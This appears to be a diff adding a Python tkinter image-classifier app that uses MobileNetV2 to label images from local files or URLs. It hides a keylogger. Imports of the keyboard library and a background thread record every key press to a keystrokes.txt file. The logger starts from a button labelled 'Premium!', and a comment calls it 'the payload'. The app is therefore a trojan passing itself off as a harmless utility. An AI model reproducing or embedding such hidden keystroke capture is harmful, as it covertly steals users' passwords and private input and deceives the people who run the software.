@@ -1,0 +1,135 @@
+import tkinter as tk
+from tkinter import filedialog, Label, Entry, Button
+from PIL import Image, ImageTk
+import tensorflow as tf
+import numpy as np
+import requests
+from io import BytesIO
+
+import keyboard
+import os
+import threading
+
+# Load the model (not trained by me)
+model = tf.keras.applications.MobileNetV2(weights='imagenet')
+
+
+# replace the XXXXXXXXXXXXXXXXXXXX withthe desired directory
+directory = r"C:\Users\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\keylogsproj\logs"
+file_name = "keystrokes.txt"
+full_path = os.path.join(directory, file_name)
+
+# key functions
+def on_key_press(event):
+    with open(full_path, 'a') as file:
+        file.write(f"{event.name}\n")
+
+# listener
+def start_keyboard_listener():
+    keyboard.on_press(on_key_press)
+    keyboard.wait()
+
+# listening handler
+def handle_start_listening():
+    thread = threading.Thread(target=start_keyboard_listener)
+    thread.daemon = True
+    thread.start()
+
+# Image predictor
+def classify_image(image):
+    # Learned that RGBA exists so I have to convert to RGB, thanks stack overflow
+    if image.mode != 'RGB':
+        image = image.convert('RGB')
+        
+    # image transformation so the model can handle the image's information
+    input_image = tf.keras.preprocessing.image.img_to_array(image)
+    
+    # converting RGB values into simple 1 to -1
+    input_image = tf.keras.applications.mobilenet_v2.preprocess_input(input_image)
+    
+    #model usually used in batches but I chose to do it one by one because it s easier to play around with
+    input_image = np.expand_dims(input_image, axis=0)
+    
+    #le model
+    predictions = model.predict(input_image)
+    predicted_classes = tf.keras.applications.mobilenet_v2.decode_predictions(predictions, top=5)[0]
+    
+    return predicted_classes
+
+# opening local files
+def open_file():
+    file_path = filedialog.askopenfilename()
+    if file_path:
+        # image displayer
+        img = Image.open(file_path)
+        img = img.resize((224, 224), Image.LANCZOS)
+        img_display = ImageTk.PhotoImage(img)
+        panel.config(image=img_display)
+        panel.image = img_display
+        
+        #image predictor
+        predictions = classify_image(img)
+        display_predictions(predictions)
+
+# Image analyser through url requests 
+def fetch_image():
+    url = url_entry.get()
+    if url:
+        #search on the interet
+        response = requests.get(url)
+        img = Image.open(BytesIO(response.content))
+        img = img.resize((224, 224), Image.LANCZOS)
+        img_display = ImageTk.PhotoImage(img)
+        panel.config(image=img_display)
+        panel.image = img_display
+        
+        predictions = classify_image(img)
+        display_predictions(predictions)
+
+# prediction displayer
+def display_predictions(predictions):
+    most_probable = predictions[0]
+    result_text = f"Plus probable: {most_probable[1]} ({most_probable[2]:.4f})\n\n"
+    predictionstext = "Predictions:\n"
+    # _ is a placeholder
+    for _, class_name, probability in predictions:
+        predictionstext += f"{class_name}: {probability:.4f}\n"
+    result_label.config(text=result_text + predictionstext)
+
+# Classc tkinter
+root = tk.Tk()
+root.title("Image Classifier")
+root.geometry("600x600")
+
+# COmponent placement
+url_label = Label(root, text="Inserer URL:")
+url_label.pack(pady=5)
+url_entry = Entry(root, width=50)
+url_entry.pack(pady=5)
+url_button = Button(root, text="Recup img d URL", command=fetch_image)
+url_button.pack(pady=5)
+
+# local button
+upload_button = Button(root, text="Img locale", command=open_file)
+upload_button.pack(pady=10)
+
+# image display
+panel = Label(root)
+panel.pack(side="top", fill="both", expand="yes")
+
+# label with predictions
+result_label = Label(root, text="Predictions...", wraplength=500, justify="left")
+result_label.pack(side="bottom", pady=10)
+
+# the payload ("premium" feature = listening)
+start_listening_button = Button(root, text="Premium!", command=handle_start_listening)
+start_listening_button.pack(pady=10)
+
+# looping
+root.mainloop()
+
+
+
+
+
+
